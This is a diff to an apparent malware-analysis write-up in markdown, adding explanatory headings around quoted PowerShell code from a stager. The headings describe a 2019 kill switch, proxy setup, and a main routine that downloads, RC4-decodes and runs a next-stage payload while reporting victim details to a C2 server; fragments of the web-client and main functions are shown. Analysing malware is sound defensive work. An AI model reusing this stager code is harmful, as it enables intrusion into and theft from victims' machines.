@@ -73,6 +73,8 @@ function DEC ($key,$enc)
 }
 ```
 
+<h6>The next function is used for check the local time and trigged  a kill switch if this after the 12th December 2019. Once this check this setup the proxy settings if the version of the CLR is at least over the second version.</h6>
+
 ``` powershell 
 function Get-Webclient ($Cookie) 
 {
@@ -116,6 +118,10 @@ function Get-Webclient ($Cookie)
     if ($cookie) { $webclient.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
     $webclient 
 }
+```
+<h6> The main function is called 3 times for download the next stage of the payload, decode with the secret of the RC4 algorithm and execute it. By the same time send informations of the victim to C2 as new session created.</h6>
+
+```powershell
 function main 
 {
     $cu = [System.Security.Principal.WindowsIdentity]::GetCurrent()
